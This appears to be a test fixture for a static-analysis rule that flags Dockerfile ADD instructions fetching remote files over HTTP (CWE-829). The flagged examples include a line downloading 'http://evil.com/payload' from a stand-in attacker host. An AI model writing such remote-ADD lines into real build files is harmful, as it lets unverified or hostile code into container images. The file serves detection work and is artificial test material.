# CWE-829: remote add.
FROM ubuntu:20.04
# ruleid: dockerfile-add-http
ADD http://example.com/file.tar.gz /tmp/file.tar.gz
# ruleid: dockerfile-add-http
ADD http://evil.com/payload /tmp/payload
# ok: dockerfile-add-http
COPY file.tar.gz /tmp/file.tar.gz
# ok: dockerfile-add-http
ADD file.tar.gz /tmp/file.tar.gz
# ruleid: dockerfile-add-http
ADD http://cdn.example.org/lib.tar.gz /tmp/lib.tar.gz
# ruleid: dockerfile-add-http
ADD http://mirror.example.net/pkg.tgz /opt/pkg.tgz
# ok: dockerfile-add-http
COPY app.tar.gz /tmp/app.tar.gz
